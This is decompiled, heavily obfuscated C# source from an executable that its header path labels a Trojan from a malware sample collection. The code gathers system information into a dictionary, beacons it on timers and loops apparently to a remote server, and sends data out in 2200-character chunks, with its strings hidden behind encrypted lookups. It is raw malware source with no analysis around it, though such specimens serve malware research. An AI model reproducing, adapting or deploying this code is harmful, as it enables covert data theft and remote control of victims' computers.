// Decompiled with JetBrains decompiler
// Type: @Ԡ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

internal sealed class \u0040Ԡ
{
  private readonly object \u0040ӓ;
  private readonly object \u0040Ӕ;
  internal \u0040Ԫ \u0040ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  internal string \u0040Ӗ() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  internal string \u0040ӗ() => (string) this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal \u0040Ԡ(string _param1, string _param2)
  {
    int num1 = 6;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
          \u0040Ԡ.\u0040ә((object) this);
          num1 = 7;
          continue;
        case 1:
          this.\u0040Ӕ = (object) _param2;
          num1 = 8;
          continue;
        case 2:
        case 3:
          num2 = !_param2.Contains<char>('@') ? 1 : 0;
          break;
        case 6:
          \u0040Ԡ.\u0040Ә();
          if (\u0040Ԡ.\u0040Ӛ())
          {
            num1 = 0;
            continue;
          }
          goto case 1;
        case 7:
          if (!_param1.Contains<char>('@'))
          {
            num2 = 1;
            break;
          }
          \u0040Ԡ.\u0040ӛ();
          num1 = !\u0040Ԡ.\u0040Ӛ() ? 5 : 2;
          continue;
        case 8:
          goto label_9;
        default:
          goto label_3;
      }
      if (num2 == 0)
      {
        this.\u0040ӓ = (object) _param1;
        num1 = 1;
      }
      else
        break;
    }
label_3:
    throw new ArgumentException();
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ә() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => false;

  internal static class \u0040ӓ
  {
    internal static Dictionary<string, object> \u0040ӓ;
    internal static Dictionary<string, object> \u0040Ӕ;
    internal static Dictionary<string, string> \u0040ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0040ӓ()
    {
      \u0040Ԡ.\u0040ӓ.\u0040Ә();
      int num;
      if (\u0040Ԡ.\u0040ӓ.\u0040ӗ())
      {
        if (true)
        {
          num = 4;
          goto label_4;
        }
      }
      else
        goto label_8;
label_2:
      \u0040Ԡ.\u0040ӓ.\u0040ӓ = new Dictionary<string, object>();
      if (true)
      {
        num = 5;
        goto label_4;
      }
label_3:
      \u0040Ԡ.\u0040ӓ.\u0040Ӕ = new Dictionary<string, object>();
      goto label_9;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            goto label_6;
          case 1:
          case 3:
            goto label_2;
          case 2:
            goto label_9;
          case 5:
            goto label_3;
          case 6:
            goto label_7;
          default:
            if (true)
            {
              num = 2;
              continue;
            }
            goto label_6;
        }
      }
label_7:
      return;
label_6:
      \u0040Ԡ.\u0040ӓ.\u0040Ӗ();
      goto label_2;
label_8:
      num = 3;
      goto label_4;
label_9:
      \u0040Ԡ.\u0040ӓ.\u0040ӕ = new Dictionary<string, string>();
      num = 6;
      goto label_4;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӗ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => false;

    [Serializable]
    internal sealed class eVEOTZdNdUxCjdh9VLs
    {
      public static readonly object iDefSHj8vi;
      public static Action<\u0040ԫ> mmGfL881ae;

      [MethodImpl(MethodImplOptions.NoInlining)]
      static eVEOTZdNdUxCjdh9VLs()
      {
        \u0040Ԡ.\u0040ӓ.eVEOTZdNdUxCjdh9VLs.ikysycvHlJGMrBVv7JF();
        \u0040Ԡ.\u0040ӓ.eVEOTZdNdUxCjdh9VLs.iDefSHj8vi = (object) new \u0040Ԡ.\u0040ӓ.eVEOTZdNdUxCjdh9VLs();
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public eVEOTZdNdUxCjdh9VLs()
      {
        \u0040Ԡ.\u0040ӓ.eVEOTZdNdUxCjdh9VLs.ikysycvHlJGMrBVv7JF();
        \u0040Ԡ.\u0040ӓ.eVEOTZdNdUxCjdh9VLs.nV60l3vnoiG75qWHHJI((object) this);
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal void srEfCoSpLH(\u0040ԫ _param1) => \u0040Ԡ.\u0040ӓ.\u0040Ӕ[_param1.\u0040ӕ()] = (object) _param1.\u0040Ӗ();

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static void ikysycvHlJGMrBVv7JF() => \u0040ո.\u0040Ӕ();

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static bool gBJ4EcvT2GxIkFee3JB() => true;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static bool MbNKcRvAd8LjsXArAyt() => false;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static void nV60l3vnoiG75qWHHJI([In] object obj0) => obj0.\u002Ector();
    }
  }

  internal static class \u0040Ӕ
  {
    internal static object \u0040ӓ;
    internal static object \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӕ(object _param0, object _param1, \u0040Ԫ _param2)
    {
      int num1;
      if (!\u0040Ԡ.\u0040Ӕ.\u0040Ӛ())
      {
        if (true)
        {
          num1 = 3;
          goto label_5;
        }
      }
      else
        goto label_3;
label_2:
      \u0040ԝ.\u0040ؑ(_param2, (string) _param0, "");
      goto label_4;
label_3:
      num1 = 2;
      goto label_5;
label_4:
      List<string>.Enumerator enumerator = \u0040ԝ.\u0040٘((string) _param1, 2200).GetEnumerator();
      goto label_7;
label_5:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_2;
          case 1:
          case 2:
            goto label_4;
          case 4:
            goto label_7;
          default:
            num1 = 4;
            continue;
        }
      }
label_7:
      try
      {
        while (enumerator.MoveNext())
        {
          string current = enumerator.Current;
          \u0040Ԡ.\u0040Ӕ.\u0040Ӛ();
          int num2;
          if (\u0040Ԡ.\u0040Ӕ.\u0040ә())
            num2 = 2;
          else
            goto label_12;
label_11:
          switch (num2)
          {
            case 0:
            case 2:
              \u0040ԝ.\u0040ع(_param2, (string) _param0, current);
              goto label_13;
            case 4:
              goto label_14;
            default:
              goto label_13;
          }
label_12:
          num2 = 3;
          if (\u0040Ԡ.\u0040Ӕ.\u0040ә())
            goto label_11;
label_13:
          \u0040Ԡ.\u0040Ӕ.\u0040Ә(50);
          if (true)
          {
            num2 = 4;
            goto label_11;
          }
label_14:;
        }
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ(object _param0, object _param1, object _param2, \u0040Ԫ _param3)
    {
      int num1 = 2;
      double num2;
      int index;
      List<string> stringList;
      bool flag;
      double num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            stringList = \u0040ԝ.\u0040٘((string) _param2, 2200);
            num1 = 10;
            continue;
          case 1:
            num2 += num3;
            if (!\u0040Ԡ.\u0040Ӕ.\u0040Ӛ())
            {
              num1 = 6;
              continue;
            }
            goto case 10;
          case 2:
            \u0040ԝ.\u0040ؑ(_param3, (string) _param1, "");
            if (!\u0040Ԡ.\u0040Ӕ.\u0040Ӛ())
            {
              num1 = 0;
              continue;
            }
            goto case 6;
          case 3:
          case 9:
            if (!flag)
            {
              if (\u0040Ԡ.\u0040Ӕ.\u0040ә())
              {
                num1 = 12;
                continue;
              }
              goto case 0;
            }
            else
            {
              \u0040ԝ.\u0040ލ(new \u0040ԥ(_param3, new \u0040ԩ[2]
              {
                new \u0040ԩ((string) \u0040ԑ.\u0040ӕ, (string) \u0040Ԡ.\u0040Ӕ.\u0040ӝ(_param0, \u0040Ԡ.\u0040Ӕ.\u0040Ӝ(562052), \u0040ԑ.\u0040ӕ), (string) \u0040Ԡ.\u0040Ӕ.\u0040ӝ(\u0040Ԡ.\u0040Ӕ.\u0040Ӝ(589990), (object) \u0040Ԡ.\u0040Ӕ.\u0040Ӟ(num2, 1).ToString(), \u0040Ԡ.\u0040Ӕ.\u0040Ӝ(590030))),
                new \u0040ԩ((string) \u0040ԑ.\u0040ӕ, (string) \u0040Ԡ.\u0040Ӕ.\u0040ӟ(_param1, \u0040ԑ.\u0040ӕ), stringList[index], true)
              }));
              goto case 1;
            }
          case 4:
          case 11:
            index = 0;
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto case 3;
          case 5:
          case 8:
            flag = index < \u0040Ԡ.\u0040Ӕ.\u0040ӛ((object) stringList);
            goto case 3;
          case 6:
            ++index;
            num1 = 8;
            continue;
          case 7:
            num2 = 0.0;
            \u0040Ԡ.\u0040Ӕ.\u0040Ӛ();
            if (\u0040Ԡ.\u0040Ӕ.\u0040ә())
            {
              num1 = 11;
              continue;
            }
            if (!\u0040Ԡ.\u0040Ӕ.\u0040Ӛ())
            {
              num1 = 3;
              continue;
            }
            goto case 4;
          case 10:
            num3 = 100.0 / (double) \u0040Ԡ.\u0040Ӕ.\u0040ӛ((object) stringList);
            if (true)
            {
              num1 = 7;
              continue;
            }
            goto case 5;
          case 12:
            goto label_12;
          default:
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 2;
        }
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ(object _param0, object _param1, \u0040Ԫ _param2)
    {
      foreach (string str in \u0040ԝ.\u0040٘((string) _param1, 2200))
      {
        \u0040Ԡ.\u0040Ӕ.\u0040ә();
        int num;
        if (!\u0040Ԡ.\u0040Ӕ.\u0040Ӛ())
        {
          if (true)
          {
            num = 2;
            goto label_5;
          }
        }
        else
          goto label_6;
label_4:
        \u0040ԝ.\u0040ع(_param2, (string) _param0, str);
        goto label_7;
label_5:
        switch (num)
        {
          case 0:
          case 2:
            goto label_4;
          case 4:
            continue;
          default:
            goto label_7;
        }
label_6:
        num = 3;
        if (true)
          goto label_5;
label_7:
        \u0040Ԡ.\u0040Ӕ.\u0040Ә(10);
        num = 4;
        goto label_5;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0040Ӕ()
    {
      \u0040Ԡ.\u0040Ӕ.\u0040Ӡ();
      \u0040Ԡ.\u0040Ӕ.\u0040ӓ = (object) \u0040ԝ.\u0040ޒ(\u0040ԝ.\u0040ݿ(4, new \u0040ԣ(), 1));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ә(int _param0) => Thread.Sleep(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӛ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040ӛ(object _param0) => ((List<string>) _param0).Count;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӝ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӝ(object _param0, object _param1, object _param2) => (object) ((string) _param0 + (string) _param1 + (string) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static double \u0040Ӟ(double _param0, int _param1) => Math.Round(_param0, _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӟ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӡ() => \u0040ո.\u0040Ӕ();
  }

  internal sealed class \u0040ӕ
  {
    public object \u0040ӓ;
    public int \u0040Ӕ;
    public int \u0040ӕ;
    public object \u0040Ӗ;
    public object \u0040ӗ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӕ()
    {
      \u0040Ԡ.\u0040ӕ.\u0040Ӝ();
      \u0040Ԡ.\u0040ӕ.\u0040ӝ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ә()
    {
      int num = 5;
      while (true)
      {
        TimerCallback timerCallback;
        object callback;
        switch (num)
        {
          case 0:
          case 2:
            callback = this.\u0040Ӗ;
            if (callback != null)
              break;
            goto case 6;
          case 1:
            \u0040ԝ.\u0040٠();
            if (\u0040Ԡ.\u0040ӕ.\u0040Ӟ())
            {
              if (true)
              {
                num = 0;
                continue;
              }
              goto case 6;
            }
            else
            {
              if (\u0040Ԡ.\u0040ӕ.\u0040Ӟ())
              {
                num = 3;
                continue;
              }
              goto case 0;
            }
          case 3:
          case 4:
            callback = (object) timerCallback;
            break;
          case 5:
            \u0040ԝ.\u0040ө();
            if (true)
            {
              num = 1;
              continue;
            }
            goto case 3;
          case 6:
            this.\u0040Ӗ = (object) (timerCallback = new TimerCallback(this.\u0040ә));
            goto case 3;
          case 7:
            goto label_4;
          default:
            num = 6;
            continue;
        }
        Timer timer = new Timer((TimerCallback) callback, (object) null, TimeSpan.Zero, \u0040Ԡ.\u0040ӕ.\u0040Ӡ(1.0));
        num = 7;
      }
label_4:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ә(object _param1) => \u0040ԝ.\u0040ڼ((\u0040Ԡ) this.\u0040ӓ);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӛ()
    {
      int num = 3;
      while (true)
      {
        ThreadStart threadStart;
        object start;
        switch (num)
        {
          case 1:
          case 4:
            this.\u0040ӗ = (object) (threadStart = new ThreadStart(this.\u0040ӛ));
            goto default;
          case 3:
            object ӗ = this.\u0040ӗ;
            if (ӗ == null)
            {
              \u0040Ԡ.\u0040ӕ.\u0040Ӟ();
              num = \u0040Ԡ.\u0040ӕ.\u0040ӟ() ? 0 : 4;
              continue;
            }
            start = ӗ;
            break;
          case 5:
            goto label_5;
          default:
            start = (object) threadStart;
            break;
        }
        \u0040Ԡ.\u0040ӕ.\u0040ӡ((object) new Thread((ThreadStart) start));
        num = 5;
      }
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӛ()
    {
      try
      {
        Dictionary<string, object> dictionary1 = \u0040ԝ.\u0040ԅ();
        Stopwatch stopwatch = new Stopwatch();
        TimeSpan timeSpan1 = \u0040Ԡ.\u0040ӕ.\u0040Ӣ(1.0);
        string str = (string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590036);
        Dictionary<string, object> dictionary2 = new Dictionary<string, object>()
        {
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590052)] = \u0040Ԡ.\u0040ӕ.\u0040ӣ(590076),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590084)] = \u0040ԑ.\u0040Ӗ,
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590106)] = (object) \u0040ԝ.\u0040۸(),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590122)] = (object) \u0040ԝ.\u0040ب(),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590142)] = (object) \u0040ԝ.\u0040ԋ(),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590158)] = \u0040Ԡ.\u0040ӕ.\u0040Ӥ(),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(555580)] = \u0040ԑ.\u0040ӗ,
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590174)] = \u0040ԝ.\u0040؜() ? \u0040Ԡ.\u0040ӕ.\u0040ӣ(1170) : \u0040Ԡ.\u0040ӕ.\u0040ӣ(1164),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574422)] = dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574422)],
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574440)] = dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574440)],
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590192)] = !\u0040Ԡ.\u0040ӕ.\u0040ӥ((object) dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574476)].ToString()) ? \u0040Ԡ.\u0040ӕ.\u0040ӣ(1170) : \u0040Ԡ.\u0040ӕ.\u0040ӣ(1164),
          [(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590220)] = !\u0040Ԡ.\u0040ӕ.\u0040ӥ((object) dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574458)].ToString()) ? \u0040Ԡ.\u0040ӕ.\u0040ӣ(1170) : \u0040Ԡ.\u0040ӕ.\u0040ӣ(1164)
        };
        \u0040Ԡ.\u0040ӕ.\u0040Ӧ((object) stopwatch);
        while (true)
        {
          try
          {
            \u0040Ԡ.\u0040Ӗ ӗ = new \u0040Ԡ.\u0040Ӗ();
            ӗ.\u0040Ӕ = (object) this;
            int num = 3;
            Dictionary<string, string> dictionary3;
            bool flag1;
            bool flag2;
            TimeSpan timeSpan2;
            bool flag3;
            while (true)
            {
              switch (num)
              {
                case 0:
                case 2:
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590240)] = (object) \u0040ԝ.\u0040\u0607();
                  num = 7;
                  continue;
                case 1:
                  timeSpan1 = \u0040Ԡ.\u0040ӕ.\u0040Ӣ(1.0);
                  num = 21;
                  continue;
                case 3:
                  dictionary3 = \u0040ԝ.\u0040\u05FE();
                  num = 15;
                  continue;
                case 4:
                  if (!flag2)
                  {
                    timeSpan2 = \u0040Ԡ.\u0040ӕ.\u0040ө((object) stopwatch);
                    num = 6;
                    continue;
                  }
                  num = 1;
                  continue;
                case 5:
                  if (flag3)
                  {
                    if (true)
                    {
                      num = 19;
                      continue;
                    }
                    goto label_30;
                  }
                  else
                    goto label_31;
                case 6:
                  flag3 = timeSpan2.TotalMinutes >= (double) this.\u0040ӕ;
                  num = 5;
                  continue;
                case 7:
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590192)] = !\u0040Ԡ.\u0040ӕ.\u0040ӥ((object) dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574476)].ToString()) ? \u0040Ԡ.\u0040ӕ.\u0040ӣ(1170) : \u0040Ԡ.\u0040ӕ.\u0040ӣ(1164);
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590220)] = !\u0040Ԡ.\u0040ӕ.\u0040ӥ((object) dictionary1[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(574458)].ToString()) ? \u0040Ԡ.\u0040ӕ.\u0040ӣ(1170) : \u0040Ԡ.\u0040ӕ.\u0040ӣ(1164);
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590262)] = (object) str;
                  num = 16;
                  continue;
                case 8:
                case 14:
                  \u0040Ԡ.\u0040ӕ.\u0040ӡ((object) new Thread(new ThreadStart(ӗ.\u0040ӕ)));
                  num = 9;
                  continue;
                case 9:
                  goto label_33;
                case 10:
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590322)] = (object) dictionary3;
                  num = 18;
                  continue;
                case 11:
                  if (flag1)
                  {
                    num = 10;
                    continue;
                  }
                  goto case 18;
                case 12:
                  \u0040Ԡ.\u0040ӕ.\u0040Ө((object) stopwatch);
                  goto case 8;
                case 13:
                  flag1 = \u0040Ԡ.\u0040ӕ.\u0040ӧ((object) dictionary3) > 0;
                  num = 11;
                  continue;
                case 15:
                  dictionary1 = \u0040ԝ.\u0040ԅ();
                  \u0040Ԡ.\u0040ӕ.\u0040ӟ();
                  if (\u0040Ԡ.\u0040ӕ.\u0040Ӟ())
                  {
                    num = 0;
                    continue;
                  }
                  if (true)
                  {
                    num = 8;
                    continue;
                  }
                  goto label_33;
                case 16:
                  dictionary2[(string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590294)] = (object) this.\u0040Ӕ;
                  num = 13;
                  continue;
                case 17:
                  flag2 = ӗ.\u0040ӓ.\u0040ӗ();
                  goto case 4;
                case 18:
                  ӗ.\u0040ӓ = \u0040ԝ.\u0040֓((\u0040Ԡ) this.\u0040ӓ, dictionary2);
                  num = 17;
                  continue;
                case 19:
                  timeSpan1 = \u0040Ԡ.\u0040ӕ.\u0040Ӣ((double) this.\u0040Ӕ);
                  num = 20;
                  continue;
                case 20:
                  str = (string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590340);
                  num = 22;
                  continue;
                case 21:
                  str = (string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590036);
                  num = 12;
                  continue;
                case 22:
                  goto label_30;
                default:
                  num = 4;
                  continue;
              }
            }
label_30:
label_31:;
          }
          catch
          {
          }
label_33:
          \u0040Ԡ.\u0040ӕ.\u0040Ӫ(timeSpan1);
        }
      }
      catch (Exception ex)
      {
        \u0040ԝ.\u0040ܦ((string) \u0040Ԡ.\u0040ӕ.\u0040ӣ(590360), (string) \u0040Ԡ.\u0040ӕ.\u0040ӫ((object) ex));
        \u0040Ԡ.\u0040ӕ.\u0040Ӭ(30000);
        \u0040ԝ.\u0040ӕ(this.\u0040ӕ, this.\u0040Ӕ, (\u0040Ԡ) this.\u0040ӓ);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӝ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӝ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӟ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӟ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static TimeSpan \u0040Ӡ(double _param0) => TimeSpan.FromHours(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӡ(object _param0) => ((Thread) _param0).Start();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static TimeSpan \u0040Ӣ(double _param0) => TimeSpan.FromSeconds(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӣ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӥ() => (object) \u0040Ԣ.\u0040ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӥ(object _param0) => string.IsNullOrEmpty((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӧ(object _param0) => ((Stopwatch) _param0).Start();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040ӧ(object _param0) => ((Dictionary<string, string>) _param0).Count;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ө(object _param0) => ((Stopwatch) _param0).Restart();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static TimeSpan \u0040ө(object _param0) => ((Stopwatch) _param0).Elapsed;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӫ(TimeSpan _param0) => Thread.Sleep(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӫ(object _param0) => (object) ((Exception) _param0).Message;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӭ(int _param0) => Thread.Sleep(_param0);
  }

  private sealed class \u0040Ӗ
  {
    public \u0040Ԭ \u0040ӓ;
    public object \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040Ӗ()
    {
      \u0040Ԡ.\u0040Ӗ.\u0040Ӗ();
      \u0040Ԡ.\u0040Ӗ.\u0040ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      int num = 4;
      while (true)
      {
        \u0040Ԫ ӕ;
        \u0040Ԋ ԋ;
        \u0040Ԭ ӓ;
        switch (num)
        {
          case 1:
          case 2:
            ӕ = ((\u0040Ԡ) ((\u0040Ԡ.\u0040ӕ) this.\u0040Ӕ).\u0040ӓ).\u0040ӕ;
            break;
          case 4:
            ԋ = new \u0040Ԋ();
            num = 5;
            continue;
          case 5:
            ӓ = this.\u0040ӓ;
            \u0040Ԡ.\u0040Ӗ.\u0040Ә();
            num = \u0040Ԡ.\u0040Ӗ.\u0040ә() ? 0 : 1;
            continue;
          case 6:
            goto label_3;
        }
        \u0040ԝ.\u0040ݹ(ӓ, ԋ, ӕ);
        num = 6;
      }
label_3:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => false;
  }
}
